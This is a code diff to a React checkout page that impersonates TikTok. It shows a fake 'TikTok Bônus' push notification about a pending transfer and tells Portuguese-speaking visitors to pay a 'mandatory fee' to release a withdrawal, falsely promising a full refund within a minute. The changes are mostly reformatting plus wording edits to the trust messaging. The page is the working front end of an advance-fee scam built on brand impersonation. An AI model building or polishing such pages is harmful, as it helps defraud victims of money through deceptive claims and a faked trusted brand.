@@ -32,7 +32,7 @@ const Checkout = () => {
 
   useEffect(() => {
     const interval = setInterval(() => {
-      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
+      setCountdown((prev) => prev > 0 ? prev - 1 : 0);
     }, 1000);
     return () => clearInterval(interval);
   }, []);
@@ -64,42 +64,42 @@ const Checkout = () => {
   return (
     <div className="flex min-h-screen flex-col bg-white relative">
       {/* Simulated Push Notification */}
-      {showNotification && !dismissNotification && (
+      {showNotification && !dismissNotification &&
+      <div
+        className="fixed z-[9999] cursor-pointer"
+        onClick={() => {
+          setExitingNotification(true);
+          setTimeout(() => setDismissNotification(true), 400);
+        }}
+        style={{
+          animation: exitingNotification ?
+          "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards" :
+          "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
+          top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
+          left: isIOS ? "6px" : "12px",
+          right: isIOS ? "6px" : "12px",
+          ...(isIOS ? { transform: exitingNotification ? undefined : "scale(1.05)", transformOrigin: "top center" } : {})
+        }}>
+
+          {isIOS ?
+        <img
+          src={notifIos}
+          alt="Transferência pendente"
+          className="w-full max-w-md mx-auto rounded-[22px]"
+          style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
+          loading="eager"
+          decoding="async" /> : (
+
+
+        /* ── Android Style (placeholder until image provided) ── */
         <div
-          className="fixed z-[9999] cursor-pointer"
-          onClick={() => {
-            setExitingNotification(true);
-            setTimeout(() => setDismissNotification(true), 400);
-          }}
+          className="rounded-2xl p-4 mx-auto max-w-md"
           style={{
-            animation: exitingNotification
-              ? "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards"
-              : "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
-            top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
-            left: isIOS ? "6px" : "12px",
-            right: isIOS ? "6px" : "12px",
-            ...(isIOS ? { transform: exitingNotification ? undefined : "scale(1.05)", transformOrigin: "top center" } : {}),
-          }}
-        >
-          {isIOS ? (
-            <img
-              src={notifIos}
-              alt="Transferência pendente"
-              className="w-full max-w-md mx-auto rounded-[22px]"
-              style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
-              loading="eager"
-              decoding="async"
-            />
-          ) : (
-            /* ── Android Style (placeholder until image provided) ── */
-            <div
-              className="rounded-2xl p-4 mx-auto max-w-md"
-              style={{
-                fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
-                background: "#2a2a2e",
-                boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
-              }}
-            >
+            fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
+            background: "#2a2a2e",
+            boxShadow: "0 6px 24px rgba(0,0,0,0.3)"
+          }}>
+
               <div className="flex items-center gap-2 mb-2">
                 <img src={tiktokNotifIcon} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
                 <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
@@ -115,13 +115,13 @@ const Checkout = () => {
                 </div>
                 <img src={tiktokNotifIcon} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
               </div>
-            </div>
-          )}
+            </div>)
+        }
         </div>
-      )}
+      }
       {/* Page content - appears after notification */}
-      {showPage && (
-        <div style={{ animation: "fade-in 0.4s ease-out" }}>
+      {showPage &&
+      <div style={{ animation: "fade-in 0.4s ease-out" }}>
           {/* Logo */}
           <div className="flex justify-center py-6">
             <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
@@ -146,8 +146,8 @@ const Checkout = () => {
               </div>
               <p className="text-xs text-gray-500 leading-relaxed">
                 Taxa obrigatória para liberação do saque no valor de{" "}
-                <span className="font-bold text-black" style={{ whiteSpace: "nowrap" }}>R$&nbsp;{TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
-                <span className="font-bold text-primary" style={{ whiteSpace: "nowrap" }}>R$&nbsp;{TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
+                <span className="font-bold text-black">R$ {TARGET.toFixed(2).replace(".", ",")}</span>. O valor de{" "}
+                <span className="font-bold text-primary">R$ {TAX.toFixed(2).replace(".", ",")}</span> será reembolsado integralmente para você em 1 minuto.
               </p>
             </div>
 
@@ -207,17 +207,17 @@ const Checkout = () => {
 
             {/* CTA */}
             <Button
-              onClick={handlePagar}
-              className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
-            >
+            onClick={handlePagar}
+            className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground">
+
               Liberar Saque
             </Button>
 
             {/* Reembolso info */}
-            <div className="flex items-center justify-center gap-2">
-              <RefreshCw className="h-4 w-4 text-green-500" />
-              <span className="text-xs font-medium text-green-500">Reembolso automático em 1 minuto</span>
-            </div>
+            
+
+
+
 
             {/* Trust badges */}
             <div className="flex items-center justify-center gap-8 py-4">
@@ -232,13 +232,13 @@ const Checkout = () => {
               </div>
             </div>
 
-            <p className="text-xs text-gray-400 text-center">Pagamento 100% seguro</p>
+            <p className="text-xs text-gray-400 text-center">Processo 100% seguro</p>
             <p className="text-xs text-primary text-center font-medium">Precisa de ajuda?</p>
           </div>
         </div>
-      )}
-    </div>
-  );
+      }
+    </div>);
+
 };
 
 export default Checkout;
